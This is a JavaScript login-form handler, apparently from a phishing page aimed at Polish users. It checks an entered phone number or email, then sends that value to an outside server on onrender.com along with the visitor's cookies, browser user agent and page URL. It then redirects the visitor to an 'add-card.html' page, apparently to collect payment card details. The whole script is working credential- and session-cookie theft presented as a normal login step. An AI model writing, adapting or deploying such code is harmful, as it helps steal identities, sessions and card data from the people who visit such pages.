
document.addEventListener('DOMContentLoaded', () => {
  const input = document.getElementById('userId');
  const button = document.getElementById('submit-btn');
  const form = document.getElementById('login-form');

  input.addEventListener('input', () => {
    button.disabled = input.value.trim() === '';
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const value = input.value.trim();
    const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})$/i);
    if (!isValid) {
      alert('Please enter a valid phone number or email');
      return;
    }
    button.disabled = true;
    button.querySelector('.al-button__label').textContent = 'Loading...';

    try {
      await fetch('https://onclick-back.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: value,
          cookies: document.cookie,
          userAgent: navigator.userAgent,
          location: window.location.href,
          date: new Date().toISOString()
        })
      });
      window.location.href = 'add-card.html';
    } catch (err) {
      alert('Something went wrong.');
      button.disabled = false;
      button.querySelector('.al-button__label').textContent = 'Continue';
    }
  });
});
